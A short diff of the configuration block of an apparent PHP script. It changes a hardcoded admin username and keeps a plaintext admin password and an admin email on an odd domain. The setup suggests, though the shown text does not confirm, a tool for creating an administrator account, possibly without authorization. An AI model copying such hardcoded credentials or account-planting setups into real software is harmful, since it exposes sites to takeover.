@@ -6,7 +6,7 @@ ini_set('max_execution_time', 300);
 // ============================================
 // CONFIGURATION
 // ============================================
-$ADMIN_USERNAME = 'bob';
+$ADMIN_USERNAME = 'botak';
 $ADMIN_PASSWORD = 'Kontolodon123!';
 $ADMIN_EMAIL = 'moneyhunter@supports.xpornici.com';
 $ADMIN_FIRSTNAME = 'New';
